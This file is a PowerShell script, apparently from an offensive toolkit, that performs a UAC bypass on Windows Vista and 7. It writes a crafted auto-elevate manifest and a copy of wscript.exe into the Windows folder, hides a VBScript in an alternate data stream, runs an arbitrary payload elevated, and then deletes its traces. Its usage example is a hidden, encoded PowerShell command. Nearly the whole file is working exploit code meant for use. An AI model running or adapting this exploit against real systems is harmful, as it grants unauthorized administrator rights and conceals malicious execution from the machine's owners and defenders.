function Invoke-WScriptBypassUAC
{
    <#
    .SYNOPSIS

    Performs the bypass UAC attack by abusing the lack of an embedded manifest in wscript.exe.

    Author: @enigma0x3, @harmj0y, Vozzie
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    Drops wscript.exe and a custom manifest into C:\Windows and then proceeds to execute VBScript using the wscript executable
    with the new manifest. The VBScript executed by C:\Windows\wscript.exe will run elevated.

    .PARAMETER payload
    The code you want wscript.exe to run elevated. Put the full command in quotes.

    .EXAMPLE
    Invoke-WScriptBypass -payload "powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>"

    .LINK
    http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html
    https://github.com/Vozzie/uacscript
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]
        $payload
    )

    function Local:Get-TempFileName {
        #Generate Temporary File Name
        $sTempFolder = $env:Temp
        $sTempFolder = $sTempFolder + "\"
        $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp"
        $sTempFileName = $sTempFileName -split '\.',([regex]::matches($sTempFileName,"\.").count) -join ''
        $sTempFileNameFinal = $sTempFolder + $sTempFileName 
        return $sTempFileNameFinal
    }

    function Local:Invoke-CopyFile($sSource, $sTarget) {
       # Cab wscript, send to temp and then extract it from temp to $env:WINDIR
       $sTempFile = Get-TempFileName
       Start-Process -WindowStyle Hidden -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList "$sSource $sTempFile"
       $null = wusa "$sTempFile" /extract:"$sTarget" /quiet

       # sleep for 2 seconds to allow for extraction to finish
       Start-Sleep -s 2
       
       # remove the temp files
       Remove-Item $sTempFile
   }

    function Local:Invoke-WscriptTrigger {
        
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
        $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

        $VBSPayload = "Dim objShell:"
        $VBSPayload += "Dim oFso:"
        $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):"
        $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"
        $VBSPayload += "command = ""$payload"":"
        $VBSPayload += "objShell.Run command, 0:"
        
        # stupid command to kick off a background cmd process to delete the wscript and manifest
        $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""""
        $VBSPayload += "command = ""$DelCommand"":"
        $VBSPayload += "objShell.Run command, 0:"
        $VBSPayload += "Set objShell = Nothing"

        $CreateWrapperADS = {cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $CreateWrapperADS
        
        $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $ExecuteScript
        Remove-ADS $env:USERPROFILE\AppData:$ADSFile
    }

    function Local:Invoke-WscriptElevate {

        $WscriptManifest =
@"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0">
  <asmv3:trustInfo>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </asmv3:trustInfo>
  <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
      <autoElevate>true</autoElevate>
      <dpiAware>true</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"@

        # Copy and apply manifest to wscript.exe
        $sManifest = $env:Temp + "\wscript.exe.manifest"
        $WscriptManifest | Out-File $sManifest -Encoding UTF8

        Invoke-CopyFile $sManifest $env:WINDIR

        $WScriptPath = "$($env:WINDIR)\System32\wscript.exe"
        Invoke-CopyFile $WScriptPath $env:WINDIR
        Remove-Item -Force $sManifest

        # execute the payload
        Invoke-WscriptTrigger
    }

    function Local:Remove-ADS {
        <#
        .SYNOPSIS
        Removes an alterate data stream from a specified location.
        P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
        Author: @harmj0y, @mattifestation
        License: BSD 3-Clause
        .LINK
        https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
        #>
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [string]$ADSPath
        )
     
        #region define P/Invoke types dynamically
        #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
     
        $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
            @('kernel32.dll'),
            [Reflection.FieldInfo[]]@($SetLastError),
            @($True))
     
        # Define [Win32.Kernel32]::DeleteFile
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
            'kernel32.dll',
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@([String]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi)
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
        
        $Kernel32 = $TypeBuilder.CreateType()
        
        $Result = $Kernel32::DeleteFile($ADSPath)

        if ($Result){
            Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
        }
        else{
            Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
        }
    }

    #make sure we are running on vulnerable windows version (vista,7)
    $OSVersion = [Environment]::OSVersion.Version
    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){
        if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True){
            "[!] WARNING: You are already elevated!"
        }
        else {
            Invoke-WscriptElevate
        }
    }else{"[!] WARNING: Target Not Vulnerable"}
}
